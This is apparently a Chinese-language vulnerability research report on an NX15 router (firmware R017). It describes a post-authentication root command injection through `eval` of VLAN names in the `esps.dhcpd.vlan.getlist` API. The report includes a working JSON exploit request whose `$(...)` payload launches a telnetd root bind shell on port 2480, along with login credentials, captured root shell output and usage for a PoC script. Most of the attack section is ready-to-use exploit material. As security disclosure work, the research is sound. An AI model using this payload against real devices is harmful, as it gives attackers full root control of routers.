# NX15 R017 `esps.dhcpd.vlan.getlist` 后置独立 root RCE

## 1. 结论

在 NX15 R017 上，`/api/esps` 的：

- `object = esps.dhcpd.vlan`
- `method = getlist`

存在一条**新的、独立的、即时触发型后认证 root RCE**。

- **接口**：`POST /api/esps`
- **对象**：`esps.dhcpd.vlan`
- **方法**：`getlist`
- **注入点**：`param.list[]` 中的 VLAN 名称字符串
- **权限**：后认证（管理员会话）
- **结果**：以 **root** 权限执行任意命令
- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
- **结论等级**：**Confirmed / Exploited**

本轮已实机确认：

1. 不需要单引号绕过，也不需要 JSON Unicode `'` 技巧；
2. 仅靠普通字符串里的 **`$()` 命令替换** 就可以直接打穿；
3. 即使接口最后返回 `DHCP:Unknown VLAN` / `code=3083`，攻击者命令也已经执行；
4. 一次 `esps.dhcpd.vlan.getlist` 调用即可拉起 root shell。

---

## 2. 根因分析

目标脚本：

- `/usr/libexec/rpcd/esps.dhcpd.vlan`

### 2.1 `getlist` 直接读取攻击者控制的 `list[]`

在 `getlist)` 通用分支中：

```sh
json_load "$param"
...
if json_is_a list array; then
    json_select list
    idx=1
    argcount=0
    while json_is_a ${idx} string
    do
        json_get_var vlan_name ${idx}
        eval vlan_name_list${idx}="$vlan_name"
        ...
```

这里的 `vlan_name` 来自用户的 `param.list[]`，没有经过危险字符过滤。

### 2.2 真正的危险 sink

核心危险语句是：

```sh
eval vlan_name_list${idx}="$vlan_name"
```

因为这里使用了 `eval`，shell 会对拼接后的字符串再次解析。

如果 `vlan_name` 为：

```text
VLAN1$(payload)
```

则 `payload` 会在 `eval` 阶段被立即执行。

也就是说，这里不是“配置写入后再二次触发”的链，而是 **wrapper 自己立即执行** 的链。

### 2.3 业务校验发生在命令执行之后

危险 `eval` 之后，脚本才继续做 VLAN 存在性检查：

```sh
vlan_id=$(printf '%s' "$vlan_name" | tr -d "VLAN")
check="$(uci get network.lan"$vlan_id".ipaddr)"
if [ -z "$check" ];then
    result=3083
    return_json $result
    return
fi
```

因此，即使攻击字符串导致后续 `vlan_id` 变成一个不存在的名字，接口最后只会返回：

```json
{"code":3083,"message":"DHCP:Unknown VLAN"}
```

但这时攻击者命令已经被执行完毕。

### 2.4 这是 wrapper-level RCE，而不是后续业务逻辑 RCE

这条链最关键的点在于：

1. 攻击命令在 `eval vlan_name_list...` 就已经执行；
2. 后续 VLAN 存在性检查只是改变 HTTP 返回值；
3. 即使业务失败，RCE 仍然成功。

因此它属于：

> **`esps.dhcpd.vlan.getlist` 自身的 wrapper-level 命令注入**

而不是某种“VLAN 真实存在后才触发”的业务型漏洞。

---

## 3. 关键静态证据

### 3.1 用户可控 `list[]`

```sh
if json_is_a list array; then
    json_select list
    idx=1
    while json_is_a ${idx} string
    do
        json_get_var vlan_name ${idx}
```

### 3.2 直接 `eval` 用户输入

```sh
eval vlan_name_list${idx}="$vlan_name"
```

### 3.3 校验在 sink 之后

```sh
vlan_id=$(printf '%s' "$vlan_name" | tr -d "VLAN")
check="$(uci get network.lan"$vlan_id".ipaddr)"
if [ -z "$check" ];then
    result=3083
    return_json $result
    return
fi
```

### 3.4 同文件内还存在二次 `eval` 读取

后续输出阶段还有：

```sh
json_add_string "intf" "$(eval echo '$'vlan_name_list"${i}")"
```

这说明该路径整体都不安全；不过本次实机验证中，**第一个 `eval vlan_name_list...` 已足够打通 RCE**。

---

## 4. 利用方式

### 4.1 不需要原始单引号，也不需要原始 raw-body 绕过

这条链不需要：

- 原始单引号 `'`
- `\u0027` 绕过
- 手工构造复杂 raw JSON

普通 JSON 请求中直接放入命令替换即可：

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2480 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

### 4.2 预期 API 表象

接口通常会返回业务错误，例如：

```json
[{"id":1,"result":{"message":"DHCP:Unknown VLAN","data":[],"code":3083}}]
```

这是因为 payload 污染了 VLAN 名称，导致后续存在性检查失败。

但这**不代表利用失败**；相反，这恰恰证明：

- RCE 发生在业务错误返回之前；
- 返回码不能作为漏洞利用失败的判断依据。

---

## 5. 动态验证

### 5.1 登录

使用管理员凭据：

- `admin / admin123`

登录 `http://192.168.8.1/api/login/auth` 获取会话。

### 5.2 触发请求

发送：

```json
[
  {
    "id": 1,
    "object": "esps.dhcpd.vlan",
    "method": "getlist",
    "param": {
      "list": [
        "VLAN1$(echo DHCPD_VLAN_GETLIST_RCE_OK >/tmp/dhcpd_vlan_getlist_rce_marker; /usr/sbin/telnetd -p 2480 -l /bin/sh >/dev/null 2>&1)"
      ]
    }
  }
]
```

接口返回：

```json
[{"id":1,"result":{"message":"DHCP:Unknown VLAN","data":[],"code":3083}}]
```

### 5.3 Shell 验证

随后连接 `192.168.8.1:2480`，得到：

```text
BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
/ # id; cat /tmp/dhcpd_vlan_getlist_rce_marker 2>/dev/null
uid=0(root) gid=0(root)
DHCPD_VLAN_GETLIST_RCE_OK
```

这证明：

- 攻击命令已被执行；
- 执行上下文为 **root**。

### 5.4 清理

验证后已执行：

- 杀死 `telnetd -p 2480`
- 删除 `/tmp/dhcpd_vlan_getlist_rce_marker`

并确认端口已关闭。

---

## 6. POC

已落地 POC：

- `poc/postauth_esps_dhcpd_vlan_getlist_rce.py`

示例：

```bash
python3 poc/postauth_esps_dhcpd_vlan_getlist_rce.py --cleanup --port 2481
```

该脚本会：

1. 登录后台；
2. 调用 `esps.dhcpd.vlan.getlist`；
3. 注入 `VLAN1$(...)` payload；
4. 等待临时 telnet shell；
5. 验证 `id` 与 marker；
6. 在 `--cleanup` 下自动清理。

---

## 7. 影响评估

### 7.1 安全影响

攻击者在获得后台管理员会话后，可：

- 直接以 root 执行任意命令；
- 持久化后门；
- 修改网络与防火墙配置；
- 导出或破坏敏感配置；
- 接管整台路由器。

### 7.2 漏洞特点

这条链的危险程度较高，原因在于：

1. **单请求即触发**
2. **不依赖单引号绕过**
3. **即使 API 返回错误仍然成功执行**
4. **根因位于 wrapper 本身**

这使利用过程更直接，也更稳定。

---

## 8. 最终结论

`esps.dhcpd.vlan.getlist` 提供了一条新的**独立后认证 root RCE**。

根因是：

```sh
eval vlan_name_list${idx}="$vlan_name"
```

对用户可控 `list[]` 项进行了直接 `eval`。攻击者只需把 VLAN 名称写成：

```text
VLAN1$(payload)
```

即可在业务校验发生之前触发 root 命令执行。

更关键的是：

> **即使接口最终返回 `DHCP:Unknown VLAN`，攻击者命令仍然已经执行成功。**

因此这是一条确认完成、可稳定复现的 **wrapper-level post-auth root RCE**。
